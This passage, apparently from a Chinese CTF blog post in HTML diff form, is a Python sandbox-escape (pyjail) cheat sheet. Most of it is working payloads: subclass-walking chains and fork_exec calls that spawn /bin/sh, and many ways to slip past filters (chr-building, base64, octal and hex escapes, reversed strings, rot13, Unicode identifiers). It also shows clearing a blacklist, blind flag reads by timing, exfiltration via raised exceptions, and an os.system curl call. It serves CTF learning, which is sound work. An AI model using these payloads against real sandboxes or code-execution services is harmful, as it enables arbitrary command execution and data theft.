+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">](</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#object类 - warnings.WarningMessage类</span>
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">137</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">](</span><span class="s2">&#34;sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#help()函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span><span class="p">()</span> <span class="o">=&gt;</span> <span class="n">os</span> <span class="o">=&gt;</span> <span class="err">!</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span><span class="p">()</span> <span class="o">=&gt;</span> <span class="n">__main__</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">filename</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#调试器</span>
+</span></span><span class="line"><span class="cl"><span class="n">breakpoint</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#_posixsubprocess.fork_exec</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#参考https://ctftime.org/writeup/31883</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#文件读取</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#object类</span>
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;1.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;1.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;1.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bypass" class="headerLink">
+    <a href="#bypass" class="header-mark"></a>bypass</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#字符串拼接</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;sys&#39;</span><span class="o">+</span><span class="s1">&#39;tem&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;system&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;__imp&#39;</span><span class="p">,</span><span class="s1">&#39;ort__&#39;</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="s1">&#39;_&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">39</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">39</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">41</span><span class="p">))</span> <span class="o">=&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">bytes</span><span class="p">([</span><span class="mi">46</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">=&gt;</span> <span class="s1">&#39;./flag&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#编码绕过</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;__import__&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;X19pbXBvcnRfXw==&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;X19pbXBvcnRfXw==&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>  <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;X19pbXBvcnRfXw==&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)](</span><span class="s1">&#39;b3M=&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#进制转换</span>
+</span></span><span class="line"><span class="cl"><span class="n">八进制</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;print(&#39;RCE&#39;); __import__(&#39;os&#39;).system(&#39;ls&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exp</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">octal_string</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\\</span><span class="si">{</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">octal_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">十六进制</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">octal_string</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">octal_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#逆序绕过</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;__tropmi__&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;)&#34;imaohw&#34;(metsys.)&#34;so&#34;(__tropmi__&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">kali</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="s1">&#39;)&#34;imaohw&#34;(metsys.so ;so tropmi&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">kali</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;__buihf9ns__&#39;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;hf9&#39;</span><span class="p">,</span><span class="s1">&#39;ldi&#39;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="s1">&#39;__buildins__&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">codecs</span>
+</span></span><span class="line"><span class="cl"><span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;flfgrz&#34;</span><span class="p">,</span><span class="s1">&#39;rot13&#39;</span><span class="p">))(</span><span class="s1">&#39;ifconfig&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#unicode字符 / Non-ASCII Identifies</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#清空</span>
+</span></span><span class="line"><span class="cl"><span class="nb">setattr</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;__main__&#34;</span><span class="p">),</span> <span class="s2">&#34;blacklist&#34;</span><span class="p">,</span> <span class="nb">list</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#过滤eval</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;import os;os.system(&#39;curl xxx&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#过滤数字</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">=</span><span class="kc">True</span><span class="o">+</span><span class="kc">True</span><span class="o">=</span><span class="kc">True</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">=</span><span class="kc">True</span><span class="o">+</span><span class="kc">True</span><span class="o">+</span><span class="kc">True</span><span class="o">=</span><span class="kc">True</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="kc">True</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#过滤request</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#字符串request:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">list</span><span class="p">(</span><span class="nb">globals</span><span class="p">()</span><span class="o">.</span><span class="n">keys</span><span class="p">())[</span><span class="mi">11</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#request值：</span>
+</span></span><span class="line"><span class="cl"><span class="nb">globals</span><span class="p">()[</span><span class="nb">list</span><span class="p">(</span><span class="nb">globals</span><span class="p">()</span><span class="o">.</span><span class="n">keys</span><span class="p">())[</span><span class="mi">11</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#过滤引号</span>
+</span></span><span class="line"><span class="cl"><span class="nb">chr</span><span class="p">(</span><span class="mi">123</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">str</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#盲注</span>
+</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">if</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;c&#39;</span> <span class="k">else</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;flag{...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">split</span><span class="p">())(</span><span class="nb">type</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">split</span><span class="p">())(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">({</span><span class="o">..</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">remove</span><span class="p">({</span><span class="o">..</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#其他技巧</span>
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">breakpoint</span><span class="p">()</span> <span class="c1">#调试模式</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="k">lambda</span><span class="p">:</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))()</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">__builtins__</span><span class="o">:=</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">))</span><span class="ow">and</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span><span class="n">system</span><span class="p">)()(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span> <span class="c1">#过滤点</span>
+</span></span><span class="line"><span class="cl"><span class="nb">setattr</span><span class="p">(</span><span class="n">copyright</span><span class="p">,</span><span class="s1">&#39;__dict__&#39;</span><span class="p">,</span><span class="nb">globals</span><span class="p">()),</span><span class="nb">delattr</span><span class="p">(</span><span class="n">copyright</span><span class="p">,</span><span class="s1">&#39;breakpoint&#39;</span><span class="p">),</span><span class="n">breakpoint</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;txt&#34;</span><span class="p">)]</span> <span class="c1">#open未过滤，read过滤</span>
+</span></span><span class="line"><span class="cl"><span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="c1">#报错外带</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#修饰符</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@exec</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@input</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pyjail一般思路" class="headerLink">
+    <a href="#pyjail%e4%b8%80%e8%88%ac%e6%80%9d%e8%b7%af" class="header-mark"></a>pyjail一般思路</h3><p><strong>RCE方法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">一种是</span><span class="n">object</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span><span class="o">`</span><span class="err">中找到</span><span class="o">`</span><span class="n">os</span><span class="o">`</span><span class="err">模块中的类（一般是</span><span class="o">`&lt;</span><span class="n">class</span><span class="w"> </span><span class="s1">&#39;os._wrap_close&#39;</span><span class="o">&gt;`</span><span class="err">），另一种是先拿到</span><span class="o">`</span><span class="n">__builtins__</span><span class="o">`</span><span class="err">，再</span><span class="o">`</span><span class="nf">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>RCE的payload模板可以通过chrome中hackbar插件SSTI的Show subclasses with tuple拿到；</p>
+<p>利用第一种方法时，注意本地环境和远程环境中<code>os</code>模块中的类的索引（偏移量）可能不相同；</p>
+<p>如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__('os').system('sh')</code>进行RCE；</p>
+<p>读取文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)
+</span></span><span class="line"><span class="cl">print(open(&#39;/flag.txt&#39;).read())
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>get交互式shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__import__(&#39;os&#39;).system(&#39;sh&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="参考文档" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e6%a1%a3" class="header-mark"></a>参考文档</h3><p><a href="https://zhuanlan.zhihu.com/p/578966149" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/578966149</a></p>
+<p><a href="https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html" target="_blank" rel="noopener noreferrer">https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html</a></p>
